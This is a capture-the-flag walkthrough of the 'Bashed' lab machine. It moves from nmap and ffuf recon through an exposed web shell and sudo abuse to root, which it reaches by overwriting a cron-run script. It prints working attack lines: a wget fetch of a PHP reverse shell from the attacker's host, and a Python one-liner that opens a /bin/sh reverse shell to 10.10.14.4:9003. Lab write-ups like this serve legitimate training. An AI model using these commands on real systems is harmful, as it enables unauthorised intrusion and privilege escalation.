# Bashed
## Recon
We start by scanning the machine with `nmap -sC -sV -Pn 10.10.10.68`. Surprisingly only port 80 is returned:
```
nmap -sV -sC -Pn 10.10.10.68
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```

Before navigating to the site, I decided to Fuzz the directory using FFUF: `ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.68/FUZZ` which spat out some interesting directories, most notably /uploads and /dev.

Actually browsing the site, we can see that it's hosting information about a tool written that creates an interactive web shell if uploaded to a server, and that this site/server was used to develop it. Just following the insctructions, we can find the shell it in /dev/phpbash.php and run it.

From here we can navigate to arrexel's home directory and get the user flag.

## Privesc
No disrespect to the person who wrote the shell, but I prefer the linux terminal, so i ran `ran find . -writable` to find a writeable directory `drwxrwxrwx 2 root root 4096 Jun 2 07:19 uploads` and uploaded a [PHP Reverse shell](https://github.com/pentestmonkey/php-reverse-shell) of my own. I created a python server on my host machine `sudo python3 -m http.server 9002` from this directory, opened netcat `nc -lnvp 9001` and uploaded my script to the server with: `wget http://10.10.14.4:9002/php-reverse-shell.php`.

I checked my priveleges as www-data with `sudo -l` and saw
```
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
I haven't seen this output before. What I gathered is that we can't really do much with our current account, but what we can do is something (maybe anything?) as scriptmanager without a password.

The first thing I tried was `su scriptmanager`. No luck, `su: must be run from a terminal`. So I decided to upgrade to a TTY Shell (Terminal Shell). I ran `/usr/bin/script -qc /bin/bash /dev/null`, tried to SU again, but this time needed the manager account password.

I did some more digging around online and saw I could spawn a terminal as this user *with sudo* like `sudo -u scriptmanager /bin/bash`

## Privesc to Root
The first thing I did with the new account was see what I could do with sudo - `sudo -l`. Nothing. Cool. Before running to linpeas, I decided to do some enumration manually, I looked at:
```
find . -writable (find writale directories)
find / -type f -perm -0400 -ls 2>/dev/null | grep 'usr/bin' (look for programs with the SUID bit set)
cat /etc/cronjobs (looked at scheduled cronjobs)
getcap -r 2>/dev/null (check my account capabilities)
```
I couldn't find anything of note, so it was now time to use linpeas. Similarly to getting my reverse shell, I used a python server to upload linpeas.sh to /home/scriptmanager on the target, set permissions on the file with `chmod +x linpeas.sh` and ran it as scriptmanager with `./linpeas.sh`.

For those that don't know, linpeas is a script designed to completely enumerate a Linux host (there is also winpeas, the windows equivalent). It will spot numerous potential vulnerabilities in the system, categorize them on severity, and sometimes even suggest CVEs to try. The amount of info that it spits out is too vast for me to want to cover in this write-up.

Anyway, three things stuck out to me:
```
══════════╣ Searching root files in home dirs (limit 30)
/home/arrexel/.bash_history - empty

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/scripts/test.txt

╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                          
/dev/mqueue                                                                                                                                                                                                
/dev/shm
/home/scriptmanager
/run/lock
/scripts
/scripts/test.py
```

I checked the bash_history for arrexel, nothing. Read test.txt, nothing interesting and then moved to /scripts/test.py. Reading the code for the script wasn't particularly interesting - it writes the output to test.txt. Having a look at /scripts/ I saw that my account had full permissions though. When I tried to run the python script, I did not have the permissions to access test.txt. Interesting.

Judging by the fact that I couldn't write to the test.txt file and that this file was specificially listed under something to check in linpeas, I took a wild swing and assumed that the script was being run automatically by the host.
I removed the original file `rm -r test.py` and echo'd a python one liner from [JohnJHacking](https://johnjhacking.com/blog/linux-privilege-escalation-quick-and-dirty/), instead replacing test.py with a file containing just
```
echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",9003));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
```

After a couple of seconds, after opening a netcat listener on port 9003, I had root access to the box.
